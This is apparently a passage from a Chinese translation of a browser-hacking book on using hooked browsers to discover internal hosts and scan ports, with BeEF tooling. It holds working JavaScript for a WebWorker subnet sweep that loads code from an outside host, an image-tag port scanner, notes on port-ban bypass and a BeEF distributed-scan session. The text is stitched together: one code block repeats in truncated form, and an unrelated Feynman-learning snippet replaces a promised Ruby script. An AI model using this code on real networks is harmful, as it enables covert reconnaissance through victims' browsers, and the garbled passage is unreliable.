
``` 
    "', 'lowerbound':" + lowerbound +", 'upperbound':" + upperbound + "};");
   eval("w" + worker_i + ".postMessage(data);");
   console.log("Spawning worker for range: " + subnet);
}
function checkComplete(){
 if(workersDone === workers_number){
 console.log("Current workers have completed.");
 console.log("Discovery finished on network " + subnet + "/24");
   clearInterval(checkCompleteInterval);
   var end = new Date().getTime();
   //window.stop();
   console.log("Total time [" + (end-start)/1000 + "] seconds.");
   console.log("Discovered hosts:\n" + discovered_hosts.join("\n"));
 }else{
  console.log("Waiting for workers to complete..." +
   "Workers done ["+workersDone+"]");
 }
}
function scanSubnet(){
 console.log("Discovery started on network " + subnet + "/24");
 spawnWorker(1, 50);
 spawnWorker(51, 100);
 spawnWorker(101, 150);
 spawnWorker(150, 200);
 spawnWorker(201, 254);
}
// 首次调用
scanSubnet();
var checkCompleteInterval = setInterval(function(){
  checkComplete()}, checkCompleteDelay);
}else{
console.log("WebWorker not supported!");
}
```

``` 
if(!!window.Worker){
// WebWorker 代码位置
var wwloc = "http://browserhacker.com/network-discovery/worker.js";
var workersDone = 0;
var totalWorkersDone = 0;
var start = 0;
// 并行生成的 WebWorker 数量
var workers_number = 5;
// 每 0.5 秒调用一次 checkComplete()
var checkCompleteDelay = 1000;
var start = new Date().getTime();
var xhr_timeout = 5000;
var lowerbound = 1;
var upperbound = 50; // 创建 50 个 XHR 大约需要 5 秒。
var discovered_hosts = [];
var subnet =  "192.168.0.0";
var worker_i = 0;
/* 在 'start' 位置新建 WebWorker 以处理数据获取 */
function spawnWorker(lowerbound, upperbound){
   worker_i++; 
   // 使用 eval 动态创建 WebWorker 变量
   eval("var w" + worker_i + " = new Worker('" + wwloc + "');");
   eval("w" + worker_i + ".onmessage = function(oEvent){" +
   "if(oEvent.data['completed']){workersDone++;totalWorkersDone++;}else{" +
   "var host = oEvent.data['host'];" + 
   "var time = oEvent.data['time'];" +
   "console.log('Discovered host ['+host+'] in ['+time+'] ms');" + 
   "discovered_hosts.push(host);"+
   "}};");
   eval("var data = {'xhr_timeout':" + xhr_timeout + ", 'subnet':'" + subnet +
    "', 'lowerbound':" + lowerbound +", 'upperbound':" + upperbound + "};");
   eval("w" + worker_i + ".postMessage(data);");
   console.log("Spawning worker for range: " + subnet);
}
function checkComplete(){
 if(workersDone === workers_number){
 console.log("Current workers have completed.");
 console.log("Discovery finished on network " + subnet + "/24");
   clearInterval(checkCompleteInterval);
   var end = new Date().getTime();
   //window.stop();
   console.log("Total time [" + (end-start)/1000 + "] seconds.");
   console.log("Discovered hosts:\n" + discovered_hosts.join("\n"));
 }else{
  console.log("Waiting for workers to complete..." +
   "Workers done ["+workersDone+"]");
 }
}
function scanSubnet(){
 console.log("Discovery started on network " + subnet + "/24");
 spawnWorker(1, 50);
 spawnWorker(51, 100);
 spawnWorker(101, 150);
 spawnWorker(150, 200);
 spawnWorker(201, 254);
}
// 首次调用
scanSubnet();
var checkCompleteInterval = setInterval(function(){
  checkComplete()}, checkCompleteDelay);
}else{
console.log("WebWorker not supported!");
}
```

-   [pingSweep Java Applet](https://example.org/pingSweep) 附加到挂钩页面的 DOM 后，会调用 `document.pingSweep.getAliveHosts()`。如果 Applet 还未完成，则之前的调用会抛出异常，代码会等待 1 秒后再次尝试。此过程会持续进行，直到 Applet 返回所有已存活的主机列表，或 30 秒的超时时间到达。无论哪种情况，随后都会通过调用 `beef.dom.detachApplet()` 清理 DOM。

使用此技术，或前文讨论的 JavaScript 方法，你现在应该能够大致判断挂钩浏览器所在的内部网段，以及哪些主机是存活的。

# Port Scanning（端口扫描）

现在你拥有了相对准确的可用主机集合，下一阶段是确定这些主机上哪些端口是打开的。这阶段的侦察工作即为端口扫描组件。在进行进一步的定向攻击时，这一步尤为重要。

SPI Dynamics8 于 2006 年发布了首篇公开的浏览器端口扫描研究论文，原始技术在当时颇具创新性，依赖于 `<img>` 标签以及自定义的 `onload/onerror` 处理函数配合计时器。

随后，Jeremiah Grossman 在 BlackHat 2006 发表了自己的研究成果，9 其中展示了从浏览器向内部网络发起攻击的示例。随后，Petko Petkov10 发布了第一个可靠的 JavaScript 端口扫描代码实现，代码如下：

``` 
scanPort: function(callback, target, port, timeout){
 var timeout = (timeout == null)?100:timeout;
 var img = new Image();
 img.onerror = function () {
    if (!img) return;
    img = undefined;
    callback(target, port, 'open');
 };
 img.onload  = img.onerror;
 // note that http:// is used
 img.src = 'http://' + target + ':' + port;
 setTimeout(function () {
    if (!img) return;
    img = undefined;
    callback(target, port, 'closed');
 }, timeout);
},
// ports_str 例如 "80,8080,8443"
scanTarget: function(callback, target, ports_str, timeout){
 var ports = ports_str.split(",");
 for (index = 0; index < ports.length; index++) {
    this.scanPort(callback, target, ports[index], timeout);
 };
}
```

尽管该技术已相当老旧，但仍被视为对你可用的相对可靠的端口扫描方法。新方法如使用 CORS 或 WebSocket 请求已被提出，但可靠性较低或已在现代浏览器中被修补。需要注意的是，Petkov 的技术并非没有限制；例如，浏览器内的端口禁禁（port banning）会限制通过 HTTP 请求可访问的端口。

## Bypassing Port Banning（绕过端口禁禁）

除了 Same Origin Policy（SOP）之外，现代浏览器还有一项旨在防止对非 HTTP 服务发起攻击的限制特性——端口禁禁。该特性禁止向诸如 22、25、110、143 等特定端口发送请求，以阻止浏览器向已知端口上的服务发起连接。

---

**Port Banning** 端口禁禁是浏览器实现的安全措施，用于拒绝连接非标准 TCP 端口的请求。如果你在端口 143（IMAP 默认端口，非 HTTP）上运行一个 Web 服务器，则无法通过浏览器连接它。大多数 Web 服务器在 80、443、8080、8443 等端口提供网页内容。也有例外，例如 Web Service 及少数其他应用或协议。端口禁禁的实现因浏览器而异（不出所料）。此外，还可以放宽此安全措施，但与其他安全控制不同，它并不通过 HTTP 头、HTML 标签或属性（如 SOP）来配置，而是在浏览器的核心配置选项中完成。在 Firefox 中，可以通过访问 `about:config` 并向 `network.security.ports.banned.override` 属性中添加端口来解除禁用；在 Chrome 中则需要以命令行参数启动浏览器，例如 `--explicitly-allowed-ports=PORT`。

---

之前的 JavaScript 端口扫描实现使用了 HTTP 协议来连接自定义 TCP 端口。当然，如果目标端口被浏览器的端口禁禁列表禁止，则该方法不可行。Figure 10-6 展示了在 Firefox 中尝试通过 `http://172.16.37.147:143` 连接时的错误示例。Figure 10-7 展示了 Netcat 监听器（未接收到来自 Firefox 的任何数据）。

**Figure 10-6:** 尝试使用 HTTP 协议连接端口 143 时的错误

![c10f006.tif](img/c10f006.png)

**Figure 10-7:** Netcat 监听器（未接收到任何数据）

![c10f007.tif](img/c10f007.png)

端口禁禁阻止向特定 TCP 端口发送请求，是大多数浏览器实现的安全特性。但与 SOP 类似，端口禁禁也存在实现差异。一个典型的差异是不同浏览器禁禁的端口不同。例如，Chrome 与 Safari 会阻止 IRC 默认端口 6667，而 Firefox 与 Internet Explorer 则允许该端口。基于此行为的 IRC NAT 钻探技术以及跨协议通信与利用，正是利用了这些差异（后文将进一步说明）。

端口禁禁是由于著名的“Extended HTML Form 攻击”（Sandro Gauci 2002）而实施的。Gauci 在 2008 年重新审视此攻击，发表了《The Extended HTML Form Attack revisited》12 论文，其中列出了被端口禁-disable 的端口，并指出了不同浏览器版本之间的差异。Figure 10-8 展示了多个浏览器中被禁止端口的对比。

被禁 TCP 端口列表因开源浏览器的源码可公开而为人所知。你可以通过查看 Chrome 的 `net_util.cc`13 与 Firefox 的 `ncIOService.cpp`14 来查看具体的禁端口数字。显然，对闭源浏览器（如 Internet Explorer）无法直接查看其源码。

如果你想验证哪些端口在闭源和开源浏览器中实际被禁，可以使用下面的代码片段。服务器端是用 Ruby 编写的多线程脚本，监听 HTTP 请求并确认客户端是否建立了连接；客户端则遍历一个端口范围，发送多个 `XMLHttpRequest` 请求。

此外，还需要配置 iptables 将所有 TCP 端口转发到服务器监听的端口。假设脚本绑定在 `192.168.0.3:10000`，则下面的 iptables 规则将所有流量转发至该端口：

``` 
iptables -A PREROUTING -t nat -i eth1 -p tcp --dport\
1:65535 -j DNAT --to-destination 192.168.0.3:10000
```

这意味着无需为每个 TCP 端口单独部署监听器。下面的 Ruby 代码会在 TCP 端口 10000 上监听：

-   [使用费曼学习法](https://wiki.example.org/feynmans_learning_method)的灵感源于诺贝尔物理奖获得者**理查德·费曼**。

1.  运用费曼技巧，你只需花上`20 min`就能深入理解知识点，而且记忆深刻，*难以遗忘*。

``` 
if (condVar > someVal) {console.log("xxx")}
```

The `dist_pscanner.rb` script, available from [`https://browserhacker.com`](https://browserhacker.com), provides an interactive way to conduct a distributed port scan. It asks for which browsers to distribute the scan over, the target IP address, and the TCP port range. The script then splits up the load, and queues up the commands for each of the selected browsers. Here is the command using just a single browser (inputs are highlighted):

``` 
$ ruby ./dist_pscanner.rb 

[>>>] BeEF Distributed Port Scanner] 

 [+] Retrieved RESTful API token: 

     006c1aed13b124d0c1c8fb50c98fb35d04a78d5e 

[+] Retrieved Hooked Browsers list. Online: 3 

[+] Retrieved 185 available command modules 

[+] Online Browsers: 

[1] 127.0.0.1 - C28 Macintosh 

[2] 192.168.1.101 - C28 Windows 7 

[3] 127.0.0.1 - C28 Macintosh 

[+] Provide a comma separated list of browsers to use (i.e. 1 or 1,3 or 

    1,2,3 etc): 

1 

[+] Using: 
```
